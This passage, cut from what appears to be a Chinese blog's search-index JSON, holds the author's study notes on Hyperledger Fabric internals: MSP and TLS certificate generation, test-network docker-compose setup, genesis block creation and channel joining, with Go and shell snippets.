filepath.Join(baseDir, <span class=\"string\">\"msp\"</span>)</span><br><span class=\"line\">tlsDir := filepath.Join(baseDir, <span class=\"string\">\"tls\"</span>)</span><br><span class=\"line\">err := createFolderStructure(mspDir, <span class=\"literal\">true</span>)</span><br><span class=\"line\">err = os.MkdirAll(tlsDir, <span class=\"number\">0o755</span>)</span><br></pre></td></tr></table></figure> 该部分代码创建\nMSP 和 TLS 所需的文件夹结构。</p></li>\n<li><p><strong>生成私钥</strong>： <figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">keystore := filepath.Join(mspDir, <span class=\"string\">\"keystore\"</span>)</span><br><span class=\"line\">priv, err := csp.GeneratePrivateKey(keystore, keyAlg)</span><br></pre></td></tr></table></figure> 生成 MSP 的私钥并存储在\n<code>keystore</code> 文件夹中。</p></li>\n<li><p><strong>生成 X509 证书</strong>： <figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">cert, err := signCA.SignCertificate(</span><br><span class=\"line\">    filepath.Join(mspDir, <span class=\"string\">\"signcerts\"</span>),</span><br><span class=\"line\">    name,</span><br><span class=\"line\">    ous,</span><br><span class=\"line\">    <span class=\"literal\">nil</span>,</span><br><span class=\"line\">    getPublicKey(priv),</span><br><span class=\"line\">    x509.KeyUsageDigitalSignature,</span><br><span class=\"line\">    []x509.ExtKeyUsage{},</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure> 使用签名 CA 生成\nX509 证书，并将其存储在 <code>signcerts</code> 文件夹中。</p></li>\n<li><p><strong>导出 CA 证书</strong>： <figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">err = x509Export(</span><br><span class=\"line\">    filepath.Join(mspDir, <span class=\"string\">\"cacerts\"</span>, x509Filename(signCA.Name)),</span><br><span class=\"line\">    signCA.SignCert,</span><br><span class=\"line\">)</span><br><span class=\"line\">err = x509Export(</span><br><span class=\"line\">    filepath.Join(mspDir, <span class=\"string\">\"tlscacerts\"</span>, x509Filename(tlsCA.Name)),</span><br><span class=\"line\">    tlsCA.SignCert,</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure> 将签名 CA 和 TLS\nCA 的证书分别导出到 <code>cacerts</code> 和 <code>tlscacerts</code>\n文件夹中。</p></li>\n<li><p><strong>生成 config.yaml</strong>： <figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> nodeOUs {</span><br><span class=\"line\">    exportConfig(mspDir, filepath.Join(<span class=\"string\">\"cacerts\"</span>, x509Filename(signCA.Name)), <span class=\"literal\">true</span>)</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure> 如果启用了节点\nOU（Organizational Units），则生成 <code>config.yaml</code>\n配置文件。</p></li>\n<li><p><strong>生成 TLS 证书</strong>： <figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">tlsPrivKey, err := csp.GeneratePrivateKey(tlsDir, keyAlg)</span><br><span class=\"line\">_, err = tlsCA.SignCertificate(</span><br><span class=\"line\">    filepath.Join(tlsDir),</span><br><span class=\"line\">    name,</span><br><span class=\"line\">    <span class=\"literal\">nil</span>,</span><br><span class=\"line\">    sans,</span><br><span class=\"line\">    getPublicKey(tlsPrivKey),</span><br><span class=\"line\">    x509.KeyUsageDigitalSignature|x509.KeyUsageKeyEncipherment,</span><br><span class=\"line\">    []x509.ExtKeyUsage{</span><br><span class=\"line\">        x509.ExtKeyUsageServerAuth,</span><br><span class=\"line\">        x509.ExtKeyUsageClientAuth,</span><br><span class=\"line\">    },</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure> 生成 TLS\n私钥和证书，并将其存储在 TLS 文件夹中。</p></li>\n<li><p><strong>重命名 TLS 证书</strong>：</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">tlsFilePrefix := <span class=\"string\">\"server\"</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> nodeType == CLIENT || nodeType == ADMIN {</span><br><span class=\"line\">    tlsFilePrefix = <span class=\"string\">\"client\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\">err = os.Rename(filepath.Join(tlsDir, x509Filename(name)),</span><br><span class=\"line\">    filepath.Join(tlsDir, tlsFilePrefix+<span class=\"string\">\".crt\"</span>))</span><br></pre></td></tr></table></figure>\n<p>根据节点类型重命名生成的 TLS 证书。</p></li>\n<li><p><strong>导出私钥</strong>： <figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\">err = keyExport(tlsDir, filepath.Join(tlsDir, tlsFilePrefix+<span class=\"string\">\".key\"</span>))</span><br></pre></td></tr></table></figure>\n将私钥导出到指定文件中。</p></li>\n</ol>\n<p>该函数的主要目的是生成和配置 MSP 和 TLS\n所需的各种证书和密钥文件。</p>\n<blockquote>\n<p><code>GenerateLocalMSP</code> 和 <code>GenerateVerifyingMSP</code>\n函数的主要区别在于它们的用途和生成的内容：</p>\n<ol type=\"1\">\n<li><strong><code>GenerateLocalMSP</code></strong>:\n<ul>\n<li>主要用于生成本地 MSP（Membership Service Provider）身份工件。</li>\n<li>创建文件夹结构并生成私钥。</li>\n<li>使用签名 CA 生成 X509 证书。</li>\n<li>将签名 CA 证书和 TLS CA 证书分别写入 <code>cacerts</code> 和\n<code>tlscacerts</code> 文件夹。</li>\n<li>如果启用了节点 OU（Organizational Units），则生成\n<code>config.yaml</code> 配置文件。</li>\n<li>生成 TLS 工件，包括私钥和 X509 证书。</li>\n<li>适用于需要完整 MSP 身份的节点，如客户端、排序节点或对等节点。</li>\n</ul></li>\n<li><strong><code>GenerateVerifyingMSP</code></strong>:\n<ul>\n<li>主要用于生成验证 MSP 工件。</li>\n<li>创建文件夹结构并写入签名 CA 和 TLS CA 证书。</li>\n<li>如果启用了节点 OU，则生成 <code>config.yaml</code> 配置文件。</li>\n<li>生成一个临时的管理员证书用于单元测试。</li>\n<li>适用于只需要验证 MSP 身份的场景，不需要生成完整的本地 MSP\n身份。</li>\n</ul></li>\n</ol>\n总结：\n<ul>\n<li><code>GenerateLocalMSP</code> 生成完整的本地 MSP\n身份，包括私钥和证书。</li>\n<li><code>GenerateVerifyingMSP</code> 生成用于验证的 MSP 工件，主要包含\nCA 证书和配置文件。</li>\n</ul>\n</blockquote></li>\n<li><p><strong>生成所有用户节点（CLIENT和ADMIN）</strong></p>\n<p>同上，给每一个节点调用 <code>msp.GenerateLocalMSP</code></p></li>\n<li><p><strong>复制管理员证书到相应的文件夹</strong></p></li>\n</ul>\n<h3 id=\"msp\">1.1.2 MSP</h3>\n<p>可见上面的 <code>cryptogen generate</code>\n只干了两件事，生成各种CA证书和生成MSP。</p>\n<p>那MSP是什么？这几种类型有什么区别？<code>LocalMSP</code> 和\n<code>VerifyingMSP</code> 有什么区别？<code>nodeOUs</code>\n的作用是什么？</p>\n<p>身份认证机构（Certificate Authorities,\nCA）通过生成公钥和私钥对来发行身份，这对密钥可以用来证明身份。这个身份需要被网络识别，这时就需要用到会员服务提供者（Membership\nService Provider,\nMSP）。例如，一个节点（peer）使用其私钥对交易进行数字签名或背书。MSP用来检查该节点是否有权背书交易。然后使用节点证书中的公钥来验证附加在交易上的签名是否有效。因此，MSP是允许该身份被网络其他成员信任和识别的机制。</p>\n<p>可以将CA比作信用卡提供商，它发行多种可验证的身份。而MSP则决定哪些信用卡提供商在商店被接受。</p>\n<p>CA 提供身份，MSP 验证你的身份能不能在我这里用。</p>\n<p>在 <code>fabric-samples</code> 的\n<code>asset-transfer-basic/application-gateway</code> 中，上面由\n<code>cryptogen</code> 生成的 MSP 证书和\nCA签名被用作创建身份和签名，与网关建立连接。</p>\n<p>可以推测，在初始构建区块链网络时，验证MSP会被作为配置加载到网络里。</p>\n<p>在 Hyperledger Fabric 中，<code>NodeOUs</code> 是 Membership Service\nProvider (MSP)\n配置的一部分，用于定义和区分网络中不同节点的角色（身份）类型。<code>OU</code>\n代表 \"Organizational Unit\"（组织单位），通过配置\n<code>NodeOUs</code>，你可以明确指定每个节点在网络中的角色，例如是 Peer\n节点、Orderer 节点，还是客户端等。</p>\n<p><code>NodeOUs</code> 的作用：</p>\n<ol type=\"1\">\n<li><strong>角色区分</strong>：通过\n<code>NodeOUs</code>，可以在网络中区分不同的节点类型。例如，MSP\n可以配置哪些证书对应 Peer 节点，哪些证书对应 Orderer 节点。</li>\n<li><strong>访问控制</strong>：在 Hyperledger Fabric\n中，<code>NodeOUs</code>\n配置有助于实施更精细的访问控制策略。不同角色的节点可以被赋予不同的权限和职责，从而确保网络的安全性和有效性。</li>\n<li><strong>身份验证</strong>：当一个节点加入网络或执行操作时，MSP\n会使用 <code>NodeOUs</code>\n配置来验证该节点的身份，并确保它符合其配置的角色。例如，只有被正确标识为\nOrderer 的节点，才能参与共识过程。</li>\n</ol>\n<p>MSP 这部分感觉还没有完全理解。因为到这里，才刚刚完成了 MSP\n配置文件的创建，具体的验证逻辑等等还在后面。先留个印象，MSP\n的作用是验证用户身份的。</p>\n<h2 id=\"docker-compose\">1.2 docker-compose</h2>\n<p>至此，test-network\n完成了组织的创建。得到的文件（证书和秘钥）都保存在本地的\n<code>organization</code> 文件夹中。</p>\n<p>接下来，就是使用 <code>docker-compose</code> 进行网络的创建。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker-compose -f compose/compose-test-net.yaml -f compose/docker/docker-compose-test-net.yaml</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>在 <code>docker-compose</code> 中，你可以使用多个 <code>-f</code>\n选项来指定多个 YAML\n文件。这样做的目的是将这些文件的内容合并起来，以便更灵活地配置和管理\nDocker 服务。</p>\n</blockquote>\n<h3 id=\"具体执行内容\">1.2.1 具体执行内容</h3>\n<p>具体来说，这个 <code>docker-compose</code> 文件启动了一个 Hyperledger\nFabric 测试网络，它包括以下组件：</p>\n<ol type=\"1\">\n<li><strong>网络和卷配置</strong></li>\n</ol>\n<ul>\n<li><strong>Volumes</strong>: 定义了三个卷，用于持久化\n<code>orderer.example.com</code>、<code>peer0.org1.example.com</code> 和\n<code>peer0.org2.example.com</code>\n节点的数据。这些卷确保了即使容器停止或重启，数据仍然可以保留。</li>\n<li><strong>Networks</strong>: 定义了一个名为 <code>fabric_test</code>\n的 Docker 网络，所有服务将会连接到这个网络中以便相互通信。</li>\n</ul>\n<ol start=\"2\" type=\"1\">\n<li><strong>服务（Services）</strong></li>\n</ol>\n<ul>\n<li><p><strong>Orderer 节点：orderer.example.com</strong></p>\n<ul>\n<li><p><strong>Container Name</strong>:\n<code>orderer.example.com</code></p></li>\n<li><p><strong>Image</strong>: 使用了最新版本的\n<code>hyperledger/fabric-orderer</code> 镜像。</p></li>\n<li><p><strong>Environment</strong>:</p>\n<ul>\n<li>配置了 Fabric 的日志级别为 <code>INFO</code>。</li>\n<li>配置了 Orderer 的监听地址和端口。</li>\n<li>使用 <code>OrdererMSP</code> 作为本地 MSP（Membership Service\nProvider）。</li>\n<li>启用了 TLS，并提供了 TLS 的证书和密钥路径。</li>\n<li>配置了 Orderer 的管理端口（7053）和操作端口（9443），以及相关的 TLS\n设置。</li>\n</ul></li>\n<li><p><strong>Volumes</strong>: 挂载了组织相关的 MSP 和 TLS\n证书目录，及 Orderer 的数据存储目录。</p></li>\n<li><p><strong>Ports</strong>: 暴露了 Orderer 的主要端口 7050、管理端口\n7053、以及操作端口 9443。</p></li>\n<li><p><strong>Networks</strong>: 连接到 <code>fabric_test</code>\n网络。</p></li>\n<li><p><strong>Command</strong>：<code>orderer</code></p></li>\n</ul></li>\n<li><p><strong>Peer 节点：peer0.org1.example.com</strong></p>\n<ul>\n<li><p><strong>Container Name</strong>:\n<code>peer0.org1.example.com</code></p></li>\n<li><p><strong>Image</strong>: 使用了最新版本的\n<code>hyperledger/fabric-peer</code> 镜像。</p></li>\n<li><p><strong>Environment</strong>:</p>\n<ul>\n<li>配置了 Fabric 的日志级别为 <code>INFO</code>。</li>\n<li>启用了 TLS，并提供了 TLS 的证书和密钥路径。</li>\n<li>设置了该节点的 ID 为\n<code>peer0.org1.example.com</code>，并配置了监听地址。</li>\n<li>配置了节点的 Gossip 协议启动节点和外部端点地址。</li>\n<li>使用 <code>Org1MSP</code> 作为本地 MSP。</li>\n<li>配置了节点的操作端口（9444）和链码执行超时（300秒）。</li>\n</ul></li>\n<li><p><strong>Volumes</strong>: 挂载了组织相关的 MSP 和 TLS\n证书目录，及节点的数据存储目录。</p></li>\n<li><p><strong>Ports</strong>: 暴露了 Peer 节点的主要端口 7051、操作端口\n9444。</p></li>\n<li><p><strong>Networks</strong>: 连接到 <code>fabric_test</code>\n网络。</p></li>\n<li><p><strong>Command</strong>：<code>peer node start</code></p></li>\n</ul></li>\n<li><p><strong>Peer 节点：peer0.org2.example.com</strong></p>\n<ul>\n<li>与上面org1的类似</li>\n</ul></li>\n</ul>\n<ol start=\"3\" type=\"1\">\n<li><strong>Additional Configuration in the Second Compose\nFile</strong></li>\n</ol>\n<p>在第二个 <code>docker-compose</code> 文件中，针对\n<code>peer0.org1.example.com</code> 和\n<code>peer0.org2.example.com</code> 这两个节点，增加了一些额外的配置： -\n<strong>CORE_VM_ENDPOINT</strong>: 配置了 Docker 守护进程的 Unix\n套接字，用于管理容器内的虚拟机。 -\n<strong>CORE_VM_DOCKER_HOSTCONFIG_NETWORKMODE</strong>: 设置了 Docker\n网络模式为 <code>fabric_test</code>。</p>\n<h3 id=\"fabric-orderer-fabric-peer-镜像\">1.2.2\n<code>fabric-orderer</code> / <code>fabric-peer</code> 镜像</h3>\n<p>源码仓库中 <code>fabric/image</code> 路径下可以找到他们的\nDockerfile。</p>\n<p>简而言之，这个 Dockerfile 的设计分为两个阶段：</p>\n<ol type=\"1\">\n<li>首先在构建阶段生成所需的二进制文件（包括\n<code>peer</code>/<code>orderer</code> 和 CCaaS 相关组件）</li>\n<li>然后在运行时阶段，将这些构建产物打包到一个精简的 Ubuntu\n镜像中，并配置好环境变量和默认启动命令</li>\n</ol>\n<p>那接下来主要关注的就是 <code>orderer</code> 和 <code>peer</code>\n的具体实现了。根据镜像启动的顺序，先看 <code>orderer</code>。</p>\n<h3 id=\"peer\">1.2.3 peer</h3>\n<h3 id=\"orderer\">1.2.4 orderer</h3>\n<p>暂时理解不了 <code>peer</code> 和 <code>orderer</code>\n是怎么进行网络通信的，先放一放，看看后面干了什么，确定一下这两个指令干的事情的范围</p>\n","categories":["笔记"],"tags":["区块链","go","fabric","超级账本"]},{"title":"Hyperledger Fabric 源码精读（3）","url":"/fabric/fabric%E6%BA%90%E7%A0%81%E7%B2%BE%E8%AF%BB%20(3)/","content":"<ul>\n<li><p>开坑，学习 Fabric 的源码。</p></li>\n<li><p>思路是根据 <code>fabric-sample</code> 的\n<code>test-network</code>\n中的脚本，一行行分析。遇到里面使用的指令，看源码如何实现。</p></li>\n<li><p>下面内容非常混乱，写的毫无逻辑，之后有空重新整理一遍。</p></li>\n<li><p>一口气写完太长了，typora里会卡，分章节发。</p></li>\n<li><p>学习笔记，不保证内容正确性。</p></li>\n<li><p>因为台风改签明天了……再看一点</p></li>\n</ul>\n<span id=\"more\"></span>\n<h1 id=\"peer-node-start\">3 peer node start</h1>\n<p>有一个参数：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">--peer-chaincodedev   start peer <span class=\"keyword\">in</span> chaincode development mode</span><br></pre></td></tr></table></figure>\n<p>最终执行的是 <code>internal/peer/node/start.go</code> 中的\n<code>serve()</code> 函数。非常长，挑重点的详细记录：</p>\n<ol type=\"1\">\n<li><p><code>viper</code> 获取所有参数，输出所有环境变量</p></li>\n<li><p>检查 MSP 类型，仅支持 <code>FABRIC</code> 模式</p></li>\n<li><p><code>grpc.EnableTracing = true</code>\n（效果类似于，每次发送请求都会在控制台输出请求信息）</p></li>\n<li><p>获取核心配置</p></li>\n<li><p>创建平台注册凭证</p></li>\n<li><p>启动操作系统</p></li>\n<li><p>观察者模式，监听 <code>opsSystem.Provider</code></p></li>\n<li><p>配置链码安装路径、存储器和解码器</p></li>\n<li><p>解析 <code>peerHost</code> 和 <code>listenAddress</code>\n（这两个地址有区别吗？？）</p>\n<blockquote>\n<p>发现一个之前没搞清楚的概念，主机地址和监听地址其实是不同的，只不过大多数开发场景中，<code>peerHost</code>\n和 <code>listenAddr</code>\n可能会指向相同的主机地址，但它们的上下文和作用略有不同：一个是用于解析配置和标识网络位置，另一个是用于节点启动时的监听配置。</p>\n<p>主机地址一般是 IP 地址或域名，例如，<code>192.168.1.10</code> 或\n<code>example.com</code> 都是主机地址。</p>\n<p>监听地址可以是 IP 地址或通配符，比如 <code>0.0.0.0</code> 和\n<code>192.168.1.10</code> 都是监听地址。</p>\n<p>存在很多主机地址和监听地址不同的情况：</p>\n<p>单网卡多IP，一台电脑有多个IP地址（网卡有多个网络接口），但是只监听一个IP；使用通配符或者localhost监听。</p>\n</blockquote></li>\n<li><p>配置一堆服务端配置</p></li>\n<li><p>创建 <code>peer</code> 实例</p></li>\n<li><p>获取本地 MSP ，从 MSP 中获取身份</p></li>\n<li><p>根据身份，创建 <code>MembershipInfoProvider</code>\n，用来判断一个节点是否连接到一个组织。</p></li>\n<li><p>创建政策检查器和管理器</p></li>\n<li><p>启动 <code>aclProvider</code> (ACL 是什么？)</p>\n<blockquote>\n<p>ACL 是 Access Control List（访问控制列表），和计网中的概念相同。</p>\n</blockquote></li>\n<li><p>创建 <code>lifecycleValidatorCommitter</code>\n，用于链码生命周期管理。</p></li>\n<li><p>配置 <code>ccprovider</code></p></li>\n<li></li>\n</ol>\n","categories":["笔记"],"tags":["区块链","go","fabric","超级账本"]},{"title":"Hyperledger Fabric 源码精读（2）","url":"/fabric/fabric%E6%BA%90%E7%A0%81%E7%B2%BE%E8%AF%BB%20(2)/","content":"<ul>\n<li><p>开坑，学习 Fabric 的源码。</p></li>\n<li><p>思路是根据 <code>fabric-sample</code> 的\n<code>test-network</code>\n中的脚本，一行行分析。遇到里面使用的指令，看源码如何实现。</p></li>\n<li><p>下面内容非常混乱，写的毫无逻辑，之后有空重新整理一遍。</p></li>\n<li><p>一口气写完太长了，typora里会卡，分章节发。</p></li>\n<li><p>学习笔记，不保证内容正确性。</p></li>\n</ul>\n<span id=\"more\"></span>\n<h1 id=\"createchannel\">2 createChannel</h1>\n<p><code>network.sh</code> 的注释里明确说明，这个函数干了两件事：</p>\n<ol type=\"1\">\n<li>join the peers of org1 and org2：加入两个组织的对等节点</li>\n<li>update the <strong>anchor peers</strong> for each\norganization：更新每个组织的锚定节点</li>\n</ol>\n<p>我完善一下：</p>\n<ol type=\"1\">\n<li>创建创世区块</li>\n<li>利用创世区块创建通道</li>\n<li>加入对等节点</li>\n<li>更新锚定节点</li>\n</ol>\n<h2 id=\"创建创世区块\">2.1 创建创世区块</h2>\n<p>test-network 的脚本固定由第一个组织进行创世区块的创建。</p>\n<p>创建创世区块的核心语句是：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">configtxgen -profile ChannelUsingRaft -outputBlock ./channel-artifacts/${CHANNEL_NAME}.block -channelID $CHANNEL_NAME</span><br></pre></td></tr></table></figure>\n<p>接下来看看configtxgen</p>\n<h3 id=\"configtxgen\">2.1.1 configtxgen</h3>\n<table>\n<thead>\n<tr>\n<th>选项</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>-channelID string</code></td>\n<td>指定在配置交易中使用的通道ID。</td>\n</tr>\n<tr>\n<td><code>-configPath string</code></td>\n<td>指定包含要使用配置的路径。</td>\n</tr>\n<tr>\n<td><code>-inspectBlock string</code></td>\n<td>打印指定路径区块中包含的配置。</td>\n</tr>\n<tr>\n<td><code>-outputBlock string</code></td>\n<td>指定写入创世区块的路径。</td>\n</tr>\n<tr>\n<td><code>-profile string</code></td>\n<td>指定 <code>configtx.yaml</code> 中用于生成的配置文件。</td>\n</tr>\n</tbody>\n</table>\n<p>这个工具的输出主要受 <code>configtx.yaml</code> 文件内容的控制。</p>\n<p>默认情况下，<code>configtxgen</code> 工具会依次尝试从\n<code>$FABRIC_CFG_PATH</code> 环境变量指定的路径，当前路径和\n<code>/etc/hyperledger/fabric</code> 路径下查找\n<code>configtx.yam</code> 配置文件并读入，作为默认的配置。或者使用参数的\n<code>-configPath</code> 定义。环境变量中以<code>CONFIGTX_</code>\n前缀开头的变量也会被作为配置项。</p>\n<p>很多功能都被启用了，好像唯一的功能就是创建创世区块？</p>\n<p>在源码中，创建创世区块的核心代码都是由 <code>protoutil</code>\n这个包实现的。</p>\n<h3 id=\"protoutil\">2.1.2 protoutil</h3>\n<p><code>protoutil</code> 是 Hyperledger Fabric\n中的一个实用工具，用于处理和操作协议缓冲区（protobuf）格式的数据。Hyperledger\nFabric 使用协议缓冲区（Protobuf）作为其内部数据结构的主要序列化格式，而\n<code>protoutil</code>\n提供了一组工具和函数来简化这些数据的创建、解析、和转换过程。</p>\n<p>具体来说，<code>protoutil</code> 可能包括以下功能：</p>\n<ul>\n<li>序列化和反序列化 Protobuf 消息。</li>\n<li>生成交易提案和区块。</li>\n<li>解析和检验区块数据结构。</li>\n<li>操作链码提案、响应和其他相关的 Protobuf 消息。</li>\n</ul>\n<p>这些功能对于开发和维护 Fabric 网络至关重要，因为它们简化了与 Fabric\n内部数据结构的交互。</p>\n<p>什么是协作缓冲区 Protobuf ？https://protobuf.com.cn/overview/</p>\n<p>简言之就是类似 Json 但比 Json\n更紧凑轻量的数据格式。一个区块，无非就是一个键值对，里面存的数据不同而已。</p>\n<table>\n<colgroup>\n<col style=\"width: 25%\">\n<col style=\"width: 23%\">\n<col style=\"width: 50%\">\n</colgroup>\n<thead>\n<tr>\n<th>Field</th>\n<th>Type</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>Header</code></td>\n<td><code>*cb.BlockHeader</code></td>\n<td>Contains metadata about the block itself.</td>\n</tr>\n<tr>\n<td><code>Header.Number</code></td>\n<td><code>uint64</code></td>\n<td>The sequence number of the block.</td>\n</tr>\n<tr>\n<td><code>Header.PreviousHash</code></td>\n<td><code>[]byte</code></td>\n<td>The hash of the previous block.</td>\n</tr>\n<tr>\n<td><code>Header.DataHash</code></td>\n<td><code>[]byte</code></td>\n<td>The hash of the block's data.</td>\n</tr>\n<tr>\n<td><code>Data</code></td>\n<td><code>*cb.BlockData</code></td>\n<td>Contains the actual data of the block.</td>\n</tr>\n<tr>\n<td><code>Metadata</code></td>\n<td><code>*cb.BlockMetadata</code></td>\n<td>Contains metadata for the block.</td>\n</tr>\n<tr>\n<td><code>Metadata.Metadata</code></td>\n<td><code>[][]byte</code></td>\n<td>Array of metadata entries.</td>\n</tr>\n</tbody>\n</table>\n<p>创世区块具体的值如下：</p>\n<ul>\n<li><code>Header.Number</code>：<code>0</code>，因为这是创世区块。</li>\n<li><code>Header.PreviousHash</code>：<code>nil</code>，因为这是创世区块，没有前一个区块。</li>\n<li><code>Header.DataHash</code>：由<code>protoutil.ComputeBlockDataHash(block.Data)</code>计算得出。</li>\n<li><code>Data</code>：包含一个<code>cb.Envelope</code>，其<code>Payload</code>为<code>cb.Payload</code>，<code>Data</code>为<code>cb.ConfigEnvelope</code>。</li>\n<li><code>Metadata.Metadata</code>：包含两个条目：\n<ul>\n<li><code>cb.BlockMetadataIndex_LAST_CONFIG</code>：包含<code>cb.LastConfig{Index: 0}</code>。</li>\n<li><code>cb.BlockMetadataIndex_SIGNATURES</code>：包含<code>cb.OrdererBlockMetadata{LastConfig: &amp;cb.LastConfig{Index: 0}}</code>。</li>\n</ul></li>\n</ul>\n<p>然后把这个东西写入一个文件中\n<code>./channel-artifacts/${CHANNEL_NAME}.block</code>\n就完成了创世区块的创建。</p>\n<h2 id=\"创建通道\">2.2 创建通道</h2>\n<p>循环执行以下脚本：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">. scripts/orderer.sh <span class=\"variable\">${CHANNEL_NAME}</span>&gt; /dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><code>.</code> 命令是 <code>source</code> 命令的简写形式，用于在当前\nshell 环境中执行一个脚本文件。这意味着文件中的所有命令都会在当前 shell\n中运行，而不会创建新的子 shell。这与直接执行脚本文件（如\n<code>./script.sh</code>）不同，后者会创建一个新的子 shell\n来运行脚本中的命令。</p>\n</blockquote>\n<p>orderer.sh:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">osnadmin channel <span class=\"built_in\">join</span> </span><br><span class=\"line\">\t--channelID <span class=\"variable\">${channel_name}</span> </span><br><span class=\"line\">\t--config-block ./channel-artifacts/<span class=\"variable\">${channel_name}</span>.block </span><br><span class=\"line\">\t-o localhost:7053 </span><br><span class=\"line\">\t--ca-file <span class=\"string\">\"<span class=\"variable\">$ORDERER_CA</span>\"</span> </span><br><span class=\"line\">\t--client-cert <span class=\"string\">\"<span class=\"variable\">$ORDERER_ADMIN_TLS_SIGN_CERT</span>\"</span> </span><br><span class=\"line\">\t--client-key <span class=\"string\">\"<span class=\"variable\">$ORDERER_ADMIN_TLS_PRIVATE_KEY</span>\"</span> </span><br><span class=\"line\">&gt;&gt; log.txt 2&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<p>突然出现了一个新工具：<code>osnadmin</code></p>\n<h3 id=\"osnadmin-channel\">2.2.1 osnadmin channel</h3>\n<p>OSN 是 Ordering Service Node 的缩写。osnadmin channel\n命令允许管理员在排序节点上执行与通道相关的操作，例如<strong>加入通道</strong>、<strong>列出排序节点已加入的通道</strong>以及<strong>移除通道</strong>。必须启用通道参与API，并且在每个排序节点的\norderer.yaml 中配置Admin端点。</p>\n<p><code>osnadmin channel join</code> 干的事，就是向\n<code>https://localhost:7053/participation/v1/channels</code>\n发送了一个HTTP POST请求，请求体是上一步生成的创世区块。</p>\n<p>顺便的，<code>osnadmin channel list</code> 就是向\n<code>https://localhost:7053/participation/v1/channels/${channel-id}</code>\n发送 HTTP GET 请求，如果不携带特定的 <code>channel-id</code>\n就是返回所有通道。</p>\n<p><code>osnadmin channel remove</code> 干的事，就是向\n<code>https://localhost:7053/participation/v1/channels</code>\n发送了一个HTTP DELETE请求。</p>\n<p>这里也表明了，<code>orderer</code>\n启动的服务里应该有很多接口可调用。</p>\n<h2 id=\"对等节点加入通道\">2.3 对等节点加入通道</h2>\n<p>在排序节点上创建好了通道，接下来就是让对等节点加入通道。</p>\n<p>同样是循环执行脚本：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">peer channel <span class=\"built_in\">join</span> -b <span class=\"variable\">$BLOCKFILE</span> &gt;&amp;log.txt</span><br></pre></td></tr></table></figure>\n<p>其中\n<code>BLOCKFILE=\"./channel-artifacts/${CHANNEL_NAME}.block\"</code>\n，就是刚刚产生的创世区块。</p>\n<p>这里的 <code>peer channel</code> 好像就是\n<code>osnadmin channel</code> 的 <code>peer</code> 版。</p>\n<h3 id=\"peer-channel-join\">2.3.1 peer channel join</h3>\n<ul>\n<li><p><strong>ChannelCmdFactory</strong></p>\n<p>其中用到了一个工厂模式，<code>InitCmdFactory</code>\n，<code>peer channel</code>\n会根据不同的指令需求（是否需要背书、是否需要广播给对等节点、是否需要广播给排序节点）打包客户端。</p>\n<p><figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// ChannelCmdFactory holds the clients used by ChannelCmdFactory</span></span><br><span class=\"line\"><span class=\"keyword\">type</span> ChannelCmdFactory <span class=\"keyword\">struct</span> {</span><br><span class=\"line\">\tEndorserClient   pb.EndorserClient</span><br><span class=\"line\">\tSigner           msp.SigningIdentity</span><br><span class=\"line\">\tBroadcastClient  common.BroadcastClient</span><br><span class=\"line\">\tDeliverClient    deliverClientIntf</span><br><span class=\"line\">\tBroadcastFactory BroadcastClientFactory</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<p>执行 join 只需要背书，不需要广播给对等节点和排序节点。</p></li>\n<li><p><strong>getJoinCCSpec</strong></p>\n<p>听函数名字和链码有关，获取了一个链码的Spec，但是到目前为止我还没有创建过链码？先来看看源码：</p>\n<p><figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">getJoinCCSpec</span><span class=\"params\">()</span></span> (*pb.ChaincodeSpec, <span class=\"type\">error</span>) {</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> genesisBlockPath == common.UndefinedParamValue {</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">nil</span>, errors.New(<span class=\"string\">\"Must supply genesis block file\"</span>)</span><br><span class=\"line\">\t}</span><br><span class=\"line\"></span><br><span class=\"line\">\tgb, err := os.ReadFile(genesisBlockPath)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> err != <span class=\"literal\">nil</span> {</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"literal\">nil</span>, GBFileNotFoundErr(err.Error())</span><br><span class=\"line\">\t}</span><br><span class=\"line\">\t<span class=\"comment\">// Build the spec</span></span><br><span class=\"line\">\tinput := &amp;pb.ChaincodeInput{Args: [][]<span class=\"type\">byte</span>{[]<span class=\"type\">byte</span>(cscc.JoinChain), gb}}</span><br><span class=\"line\"></span><br><span class=\"line\">\tspec := &amp;pb.ChaincodeSpec{</span><br><span class=\"line\">\t\tType:        pb.ChaincodeSpec_Type(pb.ChaincodeSpec_Type_value[<span class=\"string\">\"GOLANG\"</span>]),</span><br><span class=\"line\">\t\tChaincodeId: &amp;pb.ChaincodeID{Name: <span 